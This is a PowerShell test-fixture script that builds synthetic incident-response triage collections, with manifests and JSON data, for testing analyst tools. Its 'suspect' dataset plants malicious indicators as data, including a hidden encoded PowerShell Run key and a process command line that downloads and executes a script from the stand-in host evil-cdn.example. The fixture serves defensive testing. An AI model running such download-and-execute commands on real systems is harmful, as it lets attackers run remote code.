# Builds synthetic IRTriage collections for analyst-tool tests (no live host data needed).

function New-FakeTriage {
    param(
        [Parameter(Mandatory)][string]$Path,
        [Parameter(Mandatory)][hashtable]$Data,
        [string]$ComputerName = 'TESTHOST',
        [switch]$Zip,
        [bool]$Elevated = $true
    )
    $enc = New-Object System.Text.UTF8Encoding($false)
    [void](New-Item -ItemType Directory -Path $Path -Force)
    $collectors = @()
    foreach ($k in $Data.Keys) {
        $json = ConvertTo-Json -InputObject @($Data[$k]) -Depth 8
        [System.IO.File]::WriteAllText((Join-Path $Path "$k.json"), $json, $enc)
        $collectors += [ordered]@{ name = $k; status = 'ok'; records = @($Data[$k]).Count; durationMs = 1; files = @("$k.json"); note = $null; error = $null }
    }
    $files = @(Get-ChildItem -LiteralPath $Path -File | Sort-Object Name | ForEach-Object {
        [ordered]@{ path = $_.Name; bytes = $_.Length; sha256 = (Get-FileHash -LiteralPath $_.FullName -Algorithm SHA256).Hash }
    })
    $manifest = [ordered]@{
        schemaVersion = 1
        tool = [ordered]@{ name = 'IRTriage'; version = 'test'; build = 'test'; scriptSha256 = $null }
        case = [ordered]@{ caseId = 'TEST-CASE'; analyst = 'tester'; executedAs = 'NT AUTHORITY\SYSTEM'; elevated = $Elevated }
        host = [ordered]@{ computerName = $ComputerName; domain = 'corp.example'; osCaption = 'Windows'; osVersion = '10.0'; osBuild = '22631' }
        run = [ordered]@{ profile = 'quick'; startUtc = '2026-01-01T00:00:00Z'; endUtc = '2026-01-01T00:00:30Z'; durationSeconds = 30 }
        collectors = $collectors
        files = $files
    }
    [System.IO.File]::WriteAllText((Join-Path $Path 'manifest.json'), (ConvertTo-Json -InputObject $manifest -Depth 8), $enc)
    if ($Zip) {
        $zipPath = "$Path.zip"
        Compress-Archive -Path (Join-Path $Path '*') -DestinationPath $zipPath -Force
        $h = (Get-FileHash -LiteralPath $zipPath -Algorithm SHA256).Hash
        [System.IO.File]::WriteAllText("$zipPath.sha256", "$h  $(Split-Path -Leaf $zipPath)`n", $enc)
        return $zipPath
    }
    return $Path
}

function Get-BaselineData {
    @{
        services = @(
            [pscustomobject]@{ Name = 'Spooler'; PathName = 'C:\Windows\System32\spoolsv.exe'; StartMode = 'Auto'; StartName = 'LocalSystem'; ServiceDll = $null; UserWritable = $false; SignatureStatus = 'Valid'; Signer = 'CN=Microsoft Windows, O=Microsoft Corporation' }
        )
        scheduled_tasks = @(
            [pscustomobject]@{ TaskPath = '\Microsoft\Windows\Defrag\'; TaskName = 'ScheduledDefrag'; Actions = 'defrag.exe -c'; RunAs = 'SYSTEM'; State = 'Ready'; IsMicrosoftPath = $true; UserWritable = $false }
        )
        autoruns_registry = @()
        local_admins = @([pscustomobject]@{ Name = 'TESTHOST\Administrator'; ObjectClass = 'User'; PrincipalSource = 'Local' })
        network_connections = @(
            [pscustomobject]@{ Protocol = 'TCP'; LocalAddress = '0.0.0.0'; LocalPort = 135; RemoteAddress = '0.0.0.0'; RemotePort = 0; State = 'Listen'; IsExternal = $false; OwningProcess = 900; ProcessName = 'svchost.exe'; ProcessPath = 'C:\Windows\System32\svchost.exe' }
        )
        processes = @(
            [pscustomobject]@{ ProcessId = 4; ParentProcessId = 0; Name = 'System'; ExecutablePath = $null; CommandLine = $null; UserWritable = $false }
        )
    }
}

function Get-SuspectData {
    $d = Get-BaselineData
    $d.services = @($d.services) + [pscustomobject]@{
        Name = 'UpdaterSvc'; PathName = 'C:\Users\Public\upd.exe -k'; StartMode = 'Auto'; StartName = 'LocalSystem'; ServiceDll = $null
        ImagePath = 'C:\Users\Public\upd.exe'; UserWritable = $true; SignatureStatus = 'NotSigned'; Signer = $null
    }
    $d.autoruns_registry = @([pscustomobject]@{
        Hive = 'HKU:CORP\jdoe'; Location = 'HKEY_USERS\S-1-5-21-1\Software\Microsoft\Windows\CurrentVersion\Run'; Name = 'OneDriveSync'
        Value = 'powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAA='; ImagePath = 'powershell.exe'; UserWritable = $false
    })
    $d.local_admins = @($d.local_admins) + [pscustomobject]@{ Name = 'TESTHOST\svc_backup'; ObjectClass = 'User'; PrincipalSource = 'Local' }
    $d.network_connections = @($d.network_connections) + [pscustomobject]@{
        Protocol = 'TCP'; LocalAddress = '10.0.0.5'; LocalPort = 50123; RemoteAddress = '203.0.113.50'; RemotePort = 443; State = 'Established'; IsExternal = $true
        OwningProcess = 4242; ProcessName = 'powershell.exe'; ProcessPath = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
    }
    $d.processes = @($d.processes) + [pscustomobject]@{
        ProcessId = 4242; ParentProcessId = 3000; ParentName = 'winword.exe'; Name = 'powershell.exe'
        ExecutablePath = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
        CommandLine = 'powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString(''http://evil-cdn.example/a.ps1'')"'
        Owner = 'CORP\jdoe'; Sha256 = ('AB' * 32); UserWritable = $false
    }
    $d.dns_cache = @([pscustomobject]@{ Entry = 'cdn1.evil-cdn.example'; RecordName = 'cdn1.evil-cdn.example'; Type = 'A'; Data = '203.0.113.50' })
    return $d
}
